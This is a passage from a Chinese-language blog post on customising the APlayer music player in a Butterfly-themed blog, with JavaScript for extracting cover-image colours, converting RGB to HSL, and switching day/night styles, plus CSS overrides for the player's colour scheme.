class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; data.<span class="property">length</span> / <span class="number">4</span>; i++) &#123;</span><br><span class="line">          r += data[i * <span class="number">4</span>]</span><br><span class="line">          g += data[i * <span class="number">4</span> + <span class="number">1</span>]</span><br><span class="line">          b += data[i * <span class="number">4</span> + <span class="number">2</span>]</span><br><span class="line">          a += data[i * <span class="number">4</span> + <span class="number">3</span>]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获得平均值</span></span><br><span class="line">        <span class="keyword">const</span> rgba = [<span class="built_in">parseInt</span>(r / fxs), <span class="built_in">parseInt</span>(g / fxs), <span class="built_in">parseInt</span>(b / fxs), <span class="built_in">parseInt</span>(a / fxs)]</span><br><span class="line">        <span class="title function_">resolve</span>(rgba)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> e</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="rgb颜色转hsl颜色"><a href="#rgb颜色转hsl颜色" class="headerlink" title="rgb颜色转hsl颜色"></a>rgb颜色转hsl颜色</h3><p>转换成hsl颜色而不适用rgb是因为hsl颜色的计算更符合人类的大脑（</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将rgb颜色转换成hsl颜色（方便人类计算）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> (r, g, b) =&gt; &#123;</span><br><span class="line">  r /= <span class="number">255</span>, g /= <span class="number">255</span>, b /= <span class="number">255</span></span><br><span class="line">  <span class="keyword">let</span> max = <span class="title class_">Math</span>.<span class="title function_">max</span>(r, g, b), min = <span class="title class_">Math</span>.<span class="title function_">min</span>(r, g, b)</span><br><span class="line">  <span class="keyword">let</span> h, s, l = (max + min) / <span class="number">2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (max == min) &#123;</span><br><span class="line">    h = s = <span class="number">0</span> <span class="comment">// achromatic</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> d = max - min</span><br><span class="line">    s = l &gt; <span class="number">0.5</span> ? d / (<span class="number">2</span> - max - min) : d / (max + min)</span><br><span class="line">    <span class="keyword">switch</span> (max) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="attr">r</span>: h = (g - b) / d + (g &lt; b ? <span class="number">6</span> : <span class="number">0</span>); <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">case</span> <span class="attr">g</span>: h = (b - r) / d + <span class="number">2</span>; <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">case</span> <span class="attr">b</span>: h = (r - g) / d + <span class="number">4</span>; <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line">    h /= <span class="number">6</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> [h, s, l]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="添加颜色"><a href="#添加颜色" class="headerlink" title="添加颜色"></a>添加颜色</h3><p>在获取曲目列表时就顺便给每一个曲目加上一个颜色值。</p>
<p>加了缓存机制，避免重复计算（如果是网络获取音乐，不缓存的话，还要发很多请求）。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 给歌曲加颜色值</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> getColor <span class="keyword">from</span> <span class="string">&quot;../Tools/getColor.js&quot;</span></span><br><span class="line"><span class="keyword">import</span> rgbToShl <span class="keyword">from</span> <span class="string">&quot;../Tools/rgbToHsl.js&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 缓存封面的颜色值</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">coverCacheMap</span> = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">async</span> (audios) =&gt; &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; audios.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> cover = audios[i].<span class="property">cover</span> || audios[i].<span class="property">pic</span></span><br><span class="line">    <span class="keyword">if</span> (cover &amp;&amp; !audios[i].<span class="property">theme</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> cache = <span class="variable language_">window</span>.<span class="property">coverCacheMap</span>.<span class="title function_">get</span>(cover)</span><br><span class="line">      <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">        audios[i].<span class="property">theme</span> = cache</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> rgba = <span class="keyword">await</span> <span class="title function_">getColor</span>(cover)</span><br><span class="line">        <span class="keyword">const</span> hsl = <span class="title function_">rgbToShl</span>(rgba[<span class="number">0</span>], rgba[<span class="number">1</span>], rgba[<span class="number">2</span>])</span><br><span class="line">        audios[i].<span class="property">theme</span> = hsl</span><br><span class="line">        <span class="comment">// 缓存颜色值</span></span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">coverCacheMap</span>.<span class="title function_">set</span>(cover, hsl)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="白天-x2F-夜晚模式"><a href="#白天-x2F-夜晚模式" class="headerlink" title="白天&#x2F;夜晚模式"></a>白天&#x2F;夜晚模式</h2><p>添加了可供白天&#x2F;夜晚模式样式切换的方法。</p>
<p>一个小技巧，:root中定义的css变量可以通过js修改从而实现改变样式。这样就不用操作DOM的行内样式啦。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * musicBlock标签外挂 按钮的夜晚/白天样式</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> ()=&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> htmlEl = <span class="variable language_">document</span>.<span class="property">documentElement</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// let darkChange = mode===&quot;dark&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 判断夜晚模式</span></span><br><span class="line">  <span class="keyword">if</span> (htmlEl.<span class="property">dataset</span>.<span class="property">theme</span> !== <span class="string">&quot;dark&quot;</span>) &#123;</span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--music-item-bg&quot;</span>, <span class="string">&quot;white&quot;</span>)</span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--music-item-words&quot;</span>, <span class="string">&quot;black&quot;</span>)</span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--music-item-shadow&quot;</span>, <span class="string">&quot;rgba(0,0,0,0.1)&quot;</span>)</span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--music-item-hover-shadow-1&quot;</span>, <span class="string">&quot;rgba(50,50,93,0.25)&quot;</span>)</span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--music-item-hover-shadow-2&quot;</span>, <span class="string">&quot;rgba(255,255,255,0.4)&quot;</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--music-item-bg&quot;</span>, <span class="string">&quot;#444444&quot;</span>)</span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--music-item-words&quot;</span>, <span class="string">&quot;white&quot;</span>)</span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--music-item-shadow&quot;</span>, <span class="string">&quot;rgba(255,255,255,0.1)&quot;</span>)</span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--music-item-hover-shadow-1&quot;</span>, <span class="string">&quot;rgba(50,50,93,0.25)&quot;</span>)</span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--music-item-hover-shadow-2&quot;</span>, <span class="string">&quot;rgba(255,255,255,0.4)&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="随时调用提示框"><a href="#随时调用提示框" class="headerlink" title="随时调用提示框"></a>随时调用提示框</h2><p>观察butterfly主题的源码后写的，所以应该只适用于butterfly（悲）。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 随时使用snackbar</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> (str) =&gt; &#123;</span><br><span class="line">  <span class="comment">// window.onload = () =&gt; &#123;</span></span><br><span class="line">  <span class="comment">// 使用提示框（如果有进行配置的话）</span></span><br><span class="line">  <span class="comment">// window.useSnackbar = (str) =&gt; &#123;</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">Snackbar</span>) &#123;</span><br><span class="line">    <span class="comment">// snackbar配置对象</span></span><br><span class="line">    <span class="keyword">const</span> snackbar = <span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">Snackbar</span></span><br><span class="line">    <span class="comment">// 页面的亮度模式</span></span><br><span class="line">    <span class="keyword">const</span> dark = <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="title function_">getAttribute</span>(<span class="string">&#x27;data-theme&#x27;</span>)</span><br><span class="line">    <span class="keyword">let</span> bgc</span><br><span class="line">    <span class="keyword">if</span> (dark === <span class="string">&quot;light&quot;</span>) &#123;</span><br><span class="line">      bgc = snackbar.<span class="property">bgLight</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dark === <span class="string">&quot;dark&quot;</span>) &#123;</span><br><span class="line">      bgc = snackbar.<span class="property">bgDark</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">Snackbar</span>.<span class="title function_">show</span>(&#123;</span><br><span class="line">      <span class="attr">backgroundColor</span>: bgc,</span><br><span class="line">      <span class="attr">text</span>: str,</span><br><span class="line">      <span class="attr">actionText</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">pos</span>: snackbar.<span class="property">position</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="播放器配色自适应"><a href="#播放器配色自适应" class="headerlink" title="播放器配色自适应"></a>播放器配色自适应</h1><p>感觉Aplayer播放器的默认样式颜色太素了，不是很好看。</p>
<p>于是我查阅了<a href="https://aplayer.js.org/#/">APlayer文档</a>，配置项可以配置主题，那我试试看。</p>
<p>但是配置了后啥也没变啊？是我瞎了还是播放器坏了？</p>
<p>观察了114514次后才发现，原来配置后改变颜色的是这玩意……</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305311235894.png"></p>
<p>那我自己去修改样式改变它的配色吧，要做就要做好点，直接按照封面自适应配色（</p>
<h2 id="样式"><a href="#样式" class="headerlink" title="样式"></a>样式</h2><p>我就光写css不写styl了吧，styl实在写不习惯（不知道这里能不能写scss（写完编译一下不就行了x）。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-pseudo">:root</span> &#123;</span><br><span class="line">  <span class="attr">--bg-color</span>: <span class="built_in">hsl</span>(<span class="number">0</span>,<span class="number">100%</span>,<span class="number">100%</span>);</span><br><span class="line">  <span class="attr">--bg-color-choose</span>: <span class="built_in">hsl</span>(<span class="number">0</span>, <span class="number">0%</span>, <span class="number">91%</span>);</span><br><span class="line">  <span class="attr">--scroll-bar-bg-color</span>: <span class="built_in">hsl</span>(<span class="number">0</span>, <span class="number">0%</span>, <span class="number">93%</span>);</span><br><span class="line">  <span class="attr">--scroll-bar-bg-color-hover</span>: <span class="built_in">hsl</span>(<span class="number">0</span>, <span class="number">0%</span>, <span class="number">50%</span>);</span><br><span class="line">  <span class="attr">--music-list-cur-color</span>: <span class="built_in">hsl</span>(<span class="number">204</span>, <span class="number">64%</span>, <span class="number">44%</span>);</span><br><span class="line">  <span class="attr">--music-words-color</span>: <span class="built_in">hsl</span>(<span class="number">15</span>, <span class="number">3%</span>, <span class="number">29%</span>);</span><br><span class="line">  <span class="attr">--music-words-color-lighter</span>: <span class="built_in">hsl</span>(<span class="number">0</span>, <span class="number">0%</span>, <span class="number">40%</span>);</span><br><span class="line">  <span class="attr">--music-words-color-lightest</span>: <span class="built_in">hsl</span>(<span class="number">0</span>, <span class="number">0%</span>, <span class="number">60%</span>);</span><br><span class="line">  <span class="attr">--music-icon-color-hover</span>: <span class="built_in">hsl</span>(<span class="number">120</span>, <span class="number">1%</span>, <span class="number">20%</span>);</span><br><span class="line">  <span class="attr">--music-player-bar</span>: <span class="built_in">hsl</span>(<span class="number">0</span>, <span class="number">0%</span>, <span class="number">80%</span>);</span><br><span class="line">  <span class="attr">--music-player-bar-load</span>: <span class="built_in">hsl</span>(<span class="number">0</span>, <span class="number">0%</span>, <span class="number">67%</span>);</span><br><span class="line">  <span class="attr">--music-player-bar-played</span>: <span class="built_in">hsl</span>(<span class="number">204</span>, <span class="number">64%</span>, <span class="number">44%</span>);</span><br><span class="line">  <span class="attr">--music-border-color</span>: <span class="built_in">hsl</span>(<span class="number">0</span>, <span class="number">0%</span>, <span class="number">93%</span>);</span><br><span class="line">  <span class="attr">--music-console-border-color</span>: <span class="built_in">hsl</span>(<span class="number">0</span>, <span class="number">0%</span>, <span class="number">91%</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 播放列表 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">var</span>(--bg-color) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 播放列表 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span><span class="selector-class">.aplayer-fixed</span> <span class="selector-class">.aplayer-list</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="built_in">var</span>(--music-border-color) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 滚动条本体 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-list</span> <span class="selector-tag">ol</span>::-webkit-scrollbar-thumb &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">var</span>(--scroll-bar-bg-color) <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">transition</span>: <span class="number">0.2s</span> all ease;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 滚动条悬停 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-list</span> <span class="selector-tag">ol</span>::-webkit-scrollbar-thumb:hover &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">var</span>(--scroll-bar-bg-color-hover) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 播放列表项 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-list</span> <span class="selector-tag">ol</span> <span class="selector-tag">li</span> &#123;</span><br><span class="line">  <span class="attribute">border-top</span>: <span class="number">1px</span> solid <span class="built_in">var</span>(--music-border-color) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 播放列表项首项 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-list</span> <span class="selector-tag">ol</span> <span class="selector-tag">li</span><span class="selector-pseudo">:first</span>-child &#123;</span><br><span class="line">  <span class="attribute">border-top</span>: none <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 播放列表项悬停 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-list</span> <span class="selector-tag">ol</span> <span class="selector-tag">li</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">var</span>(--bg-color-choose) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 正在播放 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-list</span> <span class="selector-tag">ol</span> <span class="selector-tag">li</span><span class="selector-class">.aplayer-list-light</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">var</span>(--bg-color-choose) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 正在播放指针 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-list</span> <span class="selector-tag">ol</span> <span class="selector-tag">li</span><span class="selector-class">.aplayer-list-light</span> <span class="selector-class">.aplayer-list-cur</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">var</span>(--music-list-cur-color) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 播放列表序号/艺人 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-list</span> <span class="selector-tag">ol</span> <span class="selector-tag">li</span> <span class="selector-class">.aplayer-list-index</span>,</span><br><span class="line"><span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-list</span> <span class="selector-tag">ol</span> <span class="selector-tag">li</span> <span class="selector-class">.aplayer-list-author</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">var</span>(--music-words-color-lighter) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 播放列表曲目标题 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-list</span> <span class="selector-tag">ol</span> <span class="selector-tag">li</span> <span class="selector-class">.aplayer-list-title</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">var</span>(--music-words-color) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 操作台 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span><span class="selector-class">.aplayer-fixed</span> <span class="selector-class">.aplayer-body</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">var</span>(--bg-color) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 操作台边框 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span><span class="selector-class">.aplayer-fixed</span> <span class="selector-class">.aplayer-info</span> &#123;</span><br><span class="line">  <span class="attribute">border-top</span>: <span class="number">1px</span> solid <span class="built_in">var</span>(--music-console-border-color) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 操作台曲目标题 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-info</span> <span class="selector-class">.aplayer-music</span> <span class="selector-class">.aplayer-title</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">var</span>(--music-words-color) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 操作台艺人 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-info</span> <span class="selector-class">.aplayer-music</span> <span class="selector-class">.aplayer-author</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">var</span>(--music-words-color-lighter) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 操作台图标 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-info</span> <span class="selector-class">.aplayer-controller</span> <span class="selector-class">.aplayer-time</span> <span class="selector-class">.aplayer-icon</span> path &#123;</span><br><span class="line">  fill: <span class="built_in">var</span>(--music-words-color-lighter) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 操作台图标悬停 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-info</span> <span class="selector-class">.aplayer-controller</span> <span class="selector-class">.aplayer-time</span> <span class="selector-class">.aplayer-icon</span><span class="selector-pseudo">:hover</span> path &#123;</span><br><span class="line">  fill: <span class="built_in">var</span>(--music-icon-color-hover) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 操作台曲目时长 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-info</span> <span class="selector-class">.aplayer-controller</span> <span class="selector-class">.aplayer-time</span> <span class="selector-class">.aplayer-time-inner</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">var</span>(--music-words-color-lightest) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 操作台进度条 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-info</span> <span class="selector-class">.aplayer-controller</span> <span class="selector-class">.aplayer-bar-wrap</span> <span class="selector-class">.aplayer-bar</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">var</span>(--music-player-bar);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 操作台已加载进度条 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-info</span> <span class="selector-class">.aplayer-controller</span> <span class="selector-class">.aplayer-bar-wrap</span> <span class="selector-class">.aplayer-bar</span> <span class="selector-class">.aplayer-loaded</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">var</span>(--music-player-bar-load);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 操作台已播放进度条 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-info</span> <span class="selector-class">.aplayer-controller</span> <span class="selector-class">.aplayer-bar-wrap</span> <span class="selector-class">.aplayer-bar</span> <span class="selector-class">.aplayer-played</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">var</span>(--music-player-bar-played);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 操作台进度条控制点 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-info</span> <span class="selector-class">.aplayer-controller</span> <span class="selector-class">.aplayer-bar-wrap</span> <span class="selector-class">.aplayer-bar</span> <span class="selector-class">.aplayer-played</span> <span class="selector-class">.aplayer-thumb</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">var</span>(--music-player-bar-played);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 操作台音量条 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-info</span> <span class="selector-class">.aplayer-controller</span> <span class="selector-class">.aplayer-volume-wrap</span> <span class="selector-class">.aplayer-volume-bar-wrap</span> <span class="selector-class">.aplayer-volume-bar</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">var</span>(--music-player-bar-load);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 操作台音量高低条 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-info</span> <span class="selector-class">.aplayer-controller</span> <span class="selector-class">.aplayer-volume-wrap</span> <span class="selector-class">.aplayer-volume-bar-wrap</span> <span class="selector-class">.aplayer-volume-bar</span> <span class="selector-class">.aplayer-volume</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">var</span>(--music-player-bar-load);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 操作台迷你模式开关 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span><span class="selector-class">.aplayer-fixed</span> <span class="selector-class">.aplayer-miniswitcher</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">var</span>(--scroll-bar-bg-color) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 操作台图标 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-miniswitcher</span> <span class="selector-class">.aplayer-icon</span> path &#123;</span><br><span class="line">  fill: <span class="built_in">var</span>(--music-words-color-lighter) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 操作台图标悬停 */</span></span><br><span class="line"><span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-miniswitcher</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.aplayer-icon</span> path &#123;</span><br><span class="line">  fill: <span class="built_in">var</span>(--music-icon-color-hover) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="配色方案生成"><a href="#配色方案生成" class="headerlink" title="配色方案生成"></a>配色方案生成</h2><p>添加一个根据色值自动生成配色的方法吧，兼容白天&#x2F;夜晚模式。</p>
<p>使用缓存和步进的方式减少运算量（太细致的颜色差别一般人也看不出来x）。</p>
<p>其实我觉得步进值还可以高一点，因为这样理论上最多需要缓存200个配色（虽然实际上应该刷不出这么多）。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> useSnackbar <span class="keyword">from</span> <span class="string">&quot;../Tools/useSnackbar.js&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 播放器颜色自适应</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 缓存当前的颜色</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">hueColors</span> = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line"><span class="comment">// 当前使用的缓存key</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">nowHue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> ap = <span class="variable language_">window</span>.<span class="property">fixedap</span></span><br><span class="line">  <span class="keyword">if</span> (ap) &#123;</span><br><span class="line">    <span class="comment">// 获取当前播放的样式</span></span><br><span class="line">    <span class="keyword">const</span> playList = ap.<span class="property">list</span></span><br><span class="line">    <span class="keyword">const</span> playIndex = playList.<span class="property">index</span></span><br><span class="line">    <span class="keyword">const</span> nowStyle = playList.<span class="property">audios</span>[playIndex].<span class="property">theme</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="title function_">changeStyle</span>(nowStyle)</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>)=&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="title function_">useSnackbar</span>(<span class="string">&quot;因不可抗力因素没得到封面颜色w(ﾟДﾟ)w，但至少不影响你收听啦.....((/- -)/&quot;</span>)</span><br><span class="line">          <span class="title function_">resolve</span>()</span><br><span class="line">        &#125;, <span class="number">3000</span>)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">hslToStr</span> = (<span class="params">hsl</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`hsl(<span class="subst">$&#123;hsl[<span class="number">0</span>] * <span class="number">360</span>&#125;</span>,<span class="subst">$&#123;hsl[<span class="number">1</span>] * <span class="number">100</span>&#125;</span>%,<span class="subst">$&#123;hsl[<span class="number">2</span>] * <span class="number">100</span>&#125;</span>%)`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">changeStyle</span> = (<span class="params">hsl</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> htmlEl = <span class="variable language_">document</span>.<span class="property">documentElement</span></span><br><span class="line">  <span class="keyword">const</span> mode = htmlEl.<span class="property">dataset</span>.<span class="property">theme</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> hue = hsl[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 